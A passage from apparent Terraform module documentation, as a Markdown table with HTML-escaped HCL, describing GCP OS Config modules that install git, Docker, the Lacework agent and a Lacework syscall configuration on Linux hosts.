                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| target-osconfig-deploy-git                              | ./modules/osconfig/deploy-git                         | osconfig_deploy_git                             | context.gcp.osconfig.deploy_git                                  | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_git": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-git                         | <pre>locals &&#35;123;<br/>    tool=&quot;git&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Checking for $&&#35;123;local&#46;tool&&#35;125;&#46;&#46;&#46;&quot;<br/>     if &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>        log &quot;$&&#35;123;local&#46;tool&&#35;125; not found installation required&quot;<br/>    fi<br/>    log &quot;$&&#35;123;local&#46;tool&&#35;125; path: $&&#35;40;command &#45;v  $&&#35;123;local&#46;tool&&#35;125;&&#35;41;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&&#35;95;packages = &quot;git&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&&#35;95;packages = &quot;git&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| target-osconfig-deploy-docker                           | ./modules/osconfig/deploy-docker                      | osconfig_deploy_docker                          | context.gcp.osconfig.deploy_docker                               | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_docker": {<br/>                    "docker_users": [],<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker                      | <pre>locals &&#35;123;<br/>    tool=&quot;docker&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Checking for $&&#35;123;local&#46;tool&&#35;125;&#46;&#46;&#46;&quot;<br/>    if &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>        log &quot;$&&#35;123;local&#46;tool&&#35;125; not found installation required&quot;<br/>    fi<br/>    log &quot;$&&#35;123;local&#46;tool&&#35;125; path: $&&#35;40;command &#45;v  $&&#35;123;local&#46;tool&&#35;125;&&#35;41;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            &#35; ensure non root users are added to the docker group<br/>            if &&#35;91;&&#35;91; &quot;&quot; &#33;= &quot;$&&#35;123;join&&#35;40;&quot; &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;&quot; &&#35;93;&&#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>                usermod &#45;aG docker $&&#35;123;join&&#35;40;&quot;&&#35;92;nusermod &#45;aG docker &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;<br/>            fi<br/>            exit 0; <br/>        fi<br/>        sudo apt&#45;get update<br/>        sudo apt&#45;get remove &#45;y docker docker&#45;engine docker&#46;io containerd runc<br/>        sudo apt&#45;get install &#45;y &&#35;92;<br/>            ca&#45;certificates &&#35;92;<br/>            curl &&#35;92;<br/>            gnupg &&#35;92;<br/>            lsb&#45;release<br/>        sudo mkdir &#45;p /etc/apt/keyrings<br/>        sudo rm &#45;f /etc/apt/keyrings/docker&#46;gpg<br/>        curl &#45;fsSL https://download&#46;docker&#46;com/linux/ubuntu/gpg &#124; sudo gpg &#45;&#45;dearmor &#45;o /etc/apt/keyrings/docker&#46;gpg<br/>        echo &&#35;92;<br/>        &quot;deb &&#35;91;arch=$&&#35;40;dpkg &#45;&#45;print&#45;architecture&&#35;41; signed&#45;by=/etc/apt/keyrings/docker&#46;gpg&&#35;93; https://download&#46;docker&#46;com/linux/ubuntu &&#35;92;<br/>        $&&#35;40;lsb&&#35;95;release &#45;cs&&#35;41; stable&quot; &#124; sudo tee /etc/apt/sources&#46;list&#46;d/docker&#46;list &gt; /dev/null<br/>        sudo apt&#45;get update<br/>        EOT<br/>        apt&&#35;95;packages = &quot;docker&#45;ce docker&#45;ce&#45;cli containerd&#46;io docker&#45;buildx&#45;plugin docker&#45;compose&#45;plugin&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        &#35; ensure non root users are added to the docker group<br/>        if &&#35;91;&&#35;91; &quot;&quot; &#33;= &quot;$&&#35;123;join&&#35;40;&quot; &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;&quot; &&#35;93;&&#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>            usermod &#45;aG docker $&&#35;123;join&&#35;40;&quot;&&#35;92;nusermod &#45;aG docker &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;<br/>        fi<br/>        EOT<br/>        yum&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;;<br/>            &#35; ensure non root users are added to the docker group<br/>            if &&#35;91;&&#35;91; &quot;&quot; &#33;= &quot;$&&#35;123;join&&#35;40;&quot; &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;&quot; &&#35;93;&&#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>                usermod &#45;aG docker $&&#35;123;join&&#35;40;&quot;&&#35;92;nusermod &#45;aG docker &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;<br/>            fi<br/>            exit 0; <br/>        fi<br/>        yum update &#45;y<br/>        yum remove docker &&#35;92;<br/>                  docker&#45;client &&#35;92;<br/>                  docker&#45;client&#45;latest &&#35;92;<br/>                  docker&#45;common &&#35;92;<br/>                  docker&#45;latest &&#35;92;<br/>                  docker&#45;latest&#45;logrotate &&#35;92;<br/>                  docker&#45;logrotate &&#35;92;<br/>                  docker&#45;engine<br/>        yum install &#45;y yum&#45;utils<br/>        yum&#45;config&#45;manager &#45;&#45;add&#45;repo https://download&#46;docker&#46;com/linux/centos/docker&#45;ce&#46;repo<br/>        EOT<br/>        yum&&#35;95;packages = &quot;docker&#45;ce docker&#45;ce&#45;cli containerd&#46;io docker&#45;buildx&#45;plugin docker&#45;compose&#45;plugin&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        &#35; ensure non root users are added to the docker group<br/>        if &&#35;91;&&#35;91; &quot;&quot; &#33;= &quot;$&&#35;123;join&&#35;40;&quot; &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;&quot; &&#35;93;&&#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>            usermod &#45;aG docker $&&#35;123;join&&#35;40;&quot;&&#35;92;nusermod &#45;aG docker &quot;, var&#46;inputs&&#35;91;&quot;docker&&#35;95;users&quot;&&#35;93;&&#35;41;&&#35;125;<br/>        fi<br/>        EOT<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| target-osconfig-deploy-lacework-agent                   | ./modules/osconfig/deploy-lacework-agent              | osconfig_deploy_lacework                        | context.gcp.osconfig.deploy_lacework_agent                       | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_lacework_agent": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-agent              | <pre>locals &&#35;123;<br/>    tool = &quot;lacework&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Starting&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93; &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>        log &quot;lacework already installed &#45; nothing to do&quot;<br/>    else<br/>        log &quot;lacework not installed &#45; installing&#46;&#46;&#46;&quot;<br/>        echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;setup&&#35;95;lacework&&#35;95;agent&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &#124; /bin/bash &#45;<br/>    fi<br/>    log &quot;done&#46;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93; &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        if &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93; &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    setup&&#35;95;lacework&&#35;95;agent = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/setup&&#35;95;lacework&&#35;95;agent&#46;sh&quot;, &&#35;123;<br/>        LaceworkInstallPath=&quot;/var/lib/lacework&quot;<br/>        LaceworkTempPath=var&#46;inputs&&#35;91;&quot;lacework&&#35;95;agent&&#35;95;temp&&#35;95;path&quot;&&#35;93;<br/>        Tags=jsonencode&&#35;40;var&#46;inputs&&#35;91;&quot;lacework&&#35;95;agent&&#35;95;tags&quot;&&#35;93;&&#35;41;<br/>        Hash=&quot;&quot;<br/>        Serverurl=var&#46;inputs&&#35;91;&quot;lacework&&#35;95;server&&#35;95;url&quot;&&#35;93;<br/>        Token=try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;lacework&&#35;95;agent&&#35;95;access&&#35;95;token&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;lacework&&#35;95;agent&&#35;95;access&&#35;95;token&quot;&&#35;93; : lacework&&#35;95;agent&&#35;95;access&&#35;95;token&#46;agent&&#35;91;0&&#35;93;&#46;token<br/>    &&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;setup&&#35;95;lacework&&#35;95;agent&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;setup&&#35;95;lacework&&#35;95;agent&&#35;41;<br/>            &&#35;125;<br/>        &&#35;93;<br/>    &&#35;125;<br/>&&#35;125;<br/><br/>&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;<br/>&#35; LACEWORK AGENT<br/>&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;<br/><br/>resource &quot;random&&#35;95;string&quot; &quot;this&quot; &&#35;123;<br/>    length            = 4<br/>    special           = false<br/>    upper             = false<br/>    lower             = true<br/>    numeric           = true<br/>&&#35;125;<br/><br/>resource &quot;lacework&&#35;95;agent&&#35;95;access&&#35;95;token&quot; &quot;agent&quot; &&#35;123;<br/>    count = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;lacework&&#35;95;agent&&#35;95;access&&#35;95;token&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? 0 : 1<br/>    name = &quot;endpoint&#45;agent&#45;access&#45;token&#45;$&&#35;123;random&&#35;95;string&#46;this&#46;id&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| target-osconfig-deploy-lacework-syscall-config          | ./modules/osconfig/deploy-lacework-syscall-config     | osconfig_deploy_lacework_syscall                | context.gcp.osconfig.deploy_lacework_syscall_config              | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_lacework_syscall_config": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-syscall-config     | <pre>locals &&#35;123;<br/>    tool = &quot;lacework&#45;sycall&#45;config&quot;<br/>    lacework&&#35;95;install&&#35;95;path = &quot;/var/lib/lacework&quot;<br/>    lacework&&#35;95;syscall&&#35;95;config&&#35;95;path = &quot;$&&#35;123;local&#46;lacework&&#35;95;install&&#35;95;path&&#35;125;/config/syscall&&#35;95;config&#46;yaml&quot;<br/>    syscall&&#35;95;config = file&&#35;40;var&#46;inputs&&#35;91;&quot;syscall&&#35;95;config&quot;&&#35;93;&&#35;41;<br/>    base64&&#35;95;syscall&&#35;95;config = local&#46;syscall&&#35;95;config<br/>    hash&&#35;95;syscall&&#35;95;config = sha256&&#35;40;local&#46;syscall&&#35;95;config&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    LACEWORK&&#35;95;INSTALL&&#35;95;PATH=&quot;$&&#35;123;local&#46;lacework&&#35;95;install&&#35;95;path&&#35;125;&quot;<br/>    LACEWORK&&#35;95;SYSCALL&&#35;95;CONFIG&&#35;95;PATH=$&&#35;123;local&#46;lacework&&#35;95;syscall&&#35;95;config&&#35;95;path&&#35;125;<br/>    <br/>    &#35; Check if Lacework is pre&#45;installed&#46; If installed, add syscall&&#35;95;config&#46;yaml&#46;<br/>    if &&#35;91; &#45;f &quot;$LACEWORK&&#35;95;INSTALL&&#35;95;PATH/datacollector&quot; &&#35;93;; then<br/>        log &quot;Lacework agent is installed, adding syscall&&#35;95;config&#46;yaml&#46;&#46;&#46;&quot;<br/>        if echo &quot;$&&#35;123;local&#46;hash&&#35;95;syscall&&#35;95;config&&#35;125;  $LACEWORK&&#35;95;SYSCALL&&#35;95;CONFIG&&#35;95;PATH&quot; &#124; sha256sum &#45;&#45;check &#45;&#45;status; then <br/>            log &quot;Lacework syscall&&#35;95;config&#46;yaml unchanged&quot;; <br/>        else <br/>            log &quot;Lacework syscall&&#35;95;config&#46;yaml requires update&quot;<br/>            echo &#45;n &quot;$&&#35;123;base64gzip&&#35;40;local&#46;base64&&#35;95;syscall&&#35;95;config&&#35;41;&&#35;125;&quot; &#124; base64 &#45;d &#124; gunzip &gt; $LACEWORK&&#35;95;SYSCALL&&#35;95;CONFIG&&#35;95;PATH<br/>        fi<br/>        log &quot;Lacework agent is installed, adding disable aggregation config&#46;&#46;&#46;&quot;<br/>        file&&#35;95;path=&quot;/var/lib/lacework/config/config&#46;json&quot;<br/><br/>        log &quot;Checking for ebpf aggregate&&#35;95;events disabled&#46;&#46;&#46;&quot;<br/>        grep &#45;q &&#35;x27;&quot;ebpf&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;123;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&quot;aggregate&&#35;95;events&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&quot;false&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;125;&&#35;x27; $file&&#35;95;path<br/>        if &&#35;91; $? &#45;ne 0 &&#35;93;; then<br/>            log &quot;ebpf aggregate&&#35;95;events not currently disabled&#46;&#46;&#46;&quot;<br/>            grep &#45;q &&#35;x27;&quot;ebpf&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;123;&&#35;91;^&&#35;125;&&#35;93;&&#35;42;&&#35;125;&&#35;x27; $file&&#35;95;path<br/>            if &&#35;91; $? &#45;eq 0 &&#35;93;; then<br/>                log &quot;Found existing ebpf config &#45; updating&#46;&#46;&#46;&quot;<br/>                sed &#45;i &&#35;x27;s/&quot;ebpf&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;123;&&#35;91;^&&#35;125;&&#35;93;&&#35;42;&&#35;125;/&quot;ebpf&quot;: &&#35;123;&quot;aggregate&&#35;95;events&quot;: &quot;false&quot;&&#35;125;/&&#35;x27; $file&&#35;95;path<br/>            else<br/>                log &quot;No existing ebpf config &#45; appending&#46;&#46;&#46;&quot;<br/>                sed &#45;i &&#35;x27;1s/&&#35;123;/&&#35;123;&&#35;92;n  &quot;ebpf&quot;: &&#35;123;&quot;aggregate&&#35;95;events&quot;: &quot;false&quot;&&#35;125;,/&&#35;x27; $file&&#35;95;path<br/>            fi<br/>        else<br/>            log &quot;ebpf aggregate&&#35;95;events already enabled&#46;&quot;<br/>        fi<br/>    fi<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        while &#33; &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93;; do<br/>            log &quot;lacework installation not found &#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        while &#33; &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93;; do<br/>            log &quot;lacework installation not found &#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = 